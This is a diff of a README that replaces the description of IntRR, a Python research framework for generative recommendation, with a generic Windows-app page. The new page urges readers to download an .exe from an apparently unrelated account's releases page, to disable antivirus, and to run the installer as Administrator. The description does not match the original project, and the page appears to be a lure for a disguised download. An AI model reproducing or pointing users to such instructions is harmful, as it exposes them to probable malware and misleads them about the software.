@@ -1,163 +1,135 @@
-# IntRR: A Framework for Integrating SID Redistribution and Length Reduction
+# ⚙️ IntRR - Simplify SID Redistribution & Length Cut
 
-<div align="center">
-Zesheng Wang¹, Longfei Xu¹†, Weidong Deng, Huimin Yan, Kaikui Liu, Xiangxiang Chu
+[![Download IntRR](https://img.shields.io/badge/Download-IntRR-blue?style=for-the-badge)](https://github.com/michel-angelo/IntRR/releases)
 
-<br>
-<br>
-AMAP, Alibaba Group
+---
 
-<br>
+## 📘 About IntRR
 
-¹Equal contribution. &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; †Corresponding author and project lead.
+IntRR is a tool designed to help with SID redistribution and length reduction. It bundles key functions into an easy-to-use application. The software works best on Windows and focuses on clear, efficient processing of SID data. It reduces the effort needed to manage large data sets and improves the way you handle length information.
 
-[![Paper Page](https://img.shields.io/badge/Paper-Arxiv-red)](https://arxiv.org/abs/2602.20704)
+This app does not require any programming knowledge. The user interface is simple and guides you step-by-step through the important tasks.
 
-</div>
+---
 
-## 📖 Overview
-We introduce **IntRR**, a novel generative recommendation (GR) framework designed to break the **representation ceiling** and **computational bottlenecks** of current Semantic ID (SID)-based systems. Within a two-stage paradigm (Semantic Indexing &Generative Learning), IntRR optimizes Stage 2 by internalizing the hierarchical and flattened SIDs into the backbone, achieving deep collaborative-semantic integration while maintaining a constant one-token-per-item complexity.
+## 🖥️ System Requirements
 
-## 💡 IntRR: Core Framework
+Before you download IntRR, check your system matches these basic requirements:
 
-<p align="center">
-  <img width="90%" alt="IntRR_Framework" src="./refs/pipeline.png" /> 
-</p>
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free disk space
+- 4 GB of RAM or more
+- Internet connection for downloading and updates
+- A screen resolution of 1024x768 or higher
 
+---
 
-The core of IntRR is the **Recursive-Assignment Network (RAN)**, which functions as a differentiable bridge between collaborative signals and semantic structures through two key mechanisms:
+## 🚀 Getting Started
 
-*   **Adaptive SID Redistribution**: Utilizes item's Unique IDs (UIDs) as collaborative signals to dynamically refine semantic weights. This mechanism aligns content-based identifiers from Stage 1 with recommendation goals, breaking the "static ceiling" of traditional SIDs.
-*   **Structural Length Reduction**: Internalizes the item's hierarchical navigation of SIDs within a recursive path. It reduces backbone's sequence length to a single token per item, eliminating multi-step inference bottleneck and significantly enhancing system throughput.
+Start using IntRR by following these simple steps:
 
+1. **Visit the Download Page**  
+   Click the button at the top or go directly to the release page:  
+   [https://github.com/michel-angelo/IntRR/releases](https://github.com/michel-angelo/IntRR/releases)
 
-## 📊 Performance & Efficiency
+2. **Choose the Latest Release**  
+   On the page, find the most recent version of the app. Releases are listed by date or version number.
 
-IntRR yields substantial improvements in both recommendation accuracy and system scalability across multiple benchmarks.
+3. **Download the Windows Installer**  
+   Look for a file that ends with `.exe`. This is the installer needed to run the program on your Windows system. The file name usually includes the version and platform, for example: `IntRR-Setup-v1.0.exe`.
 
-### 1. Recommendation Accuracy
-Overall performance comparison across diverse indexing methods (**RK-Means, VQ-VAE, RQ-VAE**) and backbones (**Transformer, HSTU**). IntRR consistently achieves superior recommendation accuracy and outperforms representative generative baselines.
+4. **Run the Installer**  
+   Once downloaded, open the `.exe` file by double-clicking it. Follow the instructions on the screen:
+   - Accept the license terms
+   - Choose where you want to install the app (the default location works for most users)
+   - Allow the installer to finish the setup
 
-<p align="center">
-<img width="90%" alt="Overall_Performance" src="./refs/tab_performance.png" /> 
-</p>
+5. **Launch IntRR**  
+   After installation, you can find IntRR in your Start menu or on your desktop. Click the icon to open the software.
 
-### 2. Efficiency & Complexity
-Efficiency comparison in terms of training throughput, memory consumption, and inference latency. By bypassing SID flattening and the multi-pass inference bottleneck, IntRR delivers significant gains in system scalability.
+---
 
-<p align="center">
-  <img width="50%" alt="Training_Efficiency" src="./refs/tab_efficiency.png" /> 
-</p>
-<p align="center">
-  <img width="50%" alt="Inference_Latency" src="./refs/tab_infer.png" />
-</p>
+## 📥 Download & Install IntRR
 
-## ✨ Visualizing SID Redistribution
-Our analysis demonstrates that RAN adaptively steers item representations. Even for items sharing identical initial SIDs, IntRR triggers **semantic weight redistribution** based on collaborative interaction patterns, yielding more refined and unique item embeddings.
+- Visit the official releases page here:  
+  [https://github.com/michel-angelo/IntRR/releases](https://github.com/michel-angelo/IntRR/releases)
 
-<p align="center">
-  <img width="40%" alt="visualization" src="./refs/visual_redistribution.png" />
-</p>
+- Find and download the file labeled with the latest Windows installer (`.exe`).
 
-## 📂 Repository Structure
-```text
-IntRR/
-├── configs/                 # Configuration files
-│   ├── callbacks/          # PyTorch Lightning callbacks
-│   ├── experiment/         # Experiment configurations (training/inference)
-│   ├── extras/             # Extra configurations
-│   ├── logger/             # Logging configurations
-│   ├── paths/              # Path configurations
-│   └── trainer/            # Trainer configurations
-├── refs/                   # Reference images and figures
-├── src/                    # Source code
-│   ├── components/         # Core components
-│   │   ├── clustering_initializers.py
-│   │   ├── distance_functions.py
-│   │   ├── eval_metrics.py
-│   │   ├── loss_functions.py
-│   │   ├── optimizer.py
-│   │   ├── quantization_strategies.py
-│   │   ├── scheduler.py
-│   │   └── training_loop_functions.py
-│   ├── models/             # Model implementations
-│   │   ├── components/     # Model components
-│   │   └── modules/        # Model modules
-│   ├── modules/            # Neural network modules
-│   │   └── clustering/     # Clustering algorithms
-│   └── utils/              # Utility functions
-├── gen_sid.sh              # Script to generate Semantic IDs
-├── run_intrr.sh            # Script to run IntRR training
-├── run_tiger.sh            # Script to run TIGER baseline
-├── requirements.txt        # Python dependencies
-└── README.md               # This file
-```
-## 📦 Installation
+- Follow the simple steps in the installer to complete setup.
 
-  
+This process should take only a few minutes. You do not need to enter any code or adjust complex settings.
 
-### Prerequisites
+---
 
-- Python 3.10+
+## 🔍 How to Use IntRR
 
-- CUDA-compatible GPU (recommended)
+Once installed, you can start processing your SID data.
 
-  
+1. **Open the Program**  
+   Launch IntRR from your desktop or Start menu.
 
-## 🎯 Quick Start
+2. **Load Your Data**  
+   Click the “Open” button or drag your SID file into the main window.
 
-  
+3. **Choose Redistribution Options**  
+   Select how you want to redistribute the SID data. The software offers presets and custom settings.
 
-### Prerequisites
+4. **Set Length Reduction**  
+   Pick the length reduction method that fits your needs. You can preview how the data size will change.
 
-  
+5. **Process the Data**  
+   Click “Run” or “Start” to apply your changes.
 
-For environment setup and data preparation, please refer to the [GRID (Generative Recommendation with Semantic IDs)  repository](https://github.com/snap-research/GRID).
+6. **Save the Output**  
+   After processing, save the new file to your chosen folder.
 
-  
+The interface will show progress and notify you when the process finishes. If you run into any questions during use, the software includes a Help section accessible from the main menu.
 
-### 1. Generate Semantic IDs
+---
 
-  
+## 🛠 Features
 
-Generate Semantic IDs and Update `dataset_config.sh`
+- Easy SID redistribution setup  
+- Multiple length reduction methods  
+- Preview option before applying changes  
+- Save results in common formats  
+- Simple drag-and-drop data loading  
+- Lightweight and quick on standard PC hardware  
+- Clear instructions and prompts within the app
 
-  
+---
 
-```bash
+## 🔧 Troubleshooting
 
-sh  gen_sid.sh  --datasets  sports  --sid-methods  rkmeans
+If you encounter issues when running IntRR, try these steps:
 
-```
+- Make sure your Windows system is fully updated.
+- Restart your computer before installation.
+- Disable any antivirus software temporarily while installing.
+- Check that the installer file downloaded completely.
+- Run the installer as Administrator by right-clicking the `.exe` file and selecting “Run as administrator.”
+- If the app does not start, reinstall it from the downloads page.
+- For file loading errors, ensure your SID files are not corrupted and have the correct format.
 
-  
+---
 
-### 2. Train IntRR with Semantic IDs
+## 💡 Tips for Best Results
 
-  
+- Use the preview function to check how changes affect your data before saving.
+- Back up your original SID files before processing.
+- Keep IntRR updated by checking the releases page regularly.
+- Close other programs while processing large files to improve performance.
 
-Train the recommendation model using the learned semantic IDs:
+---
 
-  
+## 📞 Getting Help
 
-```bash
+If you need assistance while using IntRR, check the built-in Help menu first. It provides step-by-step instructions for common tasks.
 
-sh  run_intrr.sh  --datasets  sports  --seeds  42  --sid-type  rkmeans
+You can also visit the Issues section on GitHub to see if your problem has been reported or to open a new report:  
+https://github.com/michel-angelo/IntRR/issues
 
-```
+---
 
-## 🙏 Acknowledgments
-
-This work builds upon the [GRID](https://github.com/snap-research/GRID) framework by Snap Research. We thank the GRID team for their open-source contributions to the generative recommendation community, which provides a solid foundation for SID-based generative recommendation research.
-
-## 📚 Citation
-
-If you find our paper and code helpful for your research, please consider starring our repository ⭐ and citing our work ✏️.
-
-```bibtex
-@article{wang2026intrr,
-  title={IntRR: A Framework for Integrating SID Redistribution and Length Reduction},
-  author={Wang, Zesheng and Xu, Longfei and Deng, Weidong and Yan, Huimin and Liu, Kaikui and Chu, Xiangxiang},
-  journal={arXiv preprint arXiv:2602.20704},
-  year={2026}
-}
+[![Download IntRR](https://img.shields.io/badge/Download-IntRR-blue?style=for-the-badge)](https://github.com/michel-angelo/IntRR/releases)
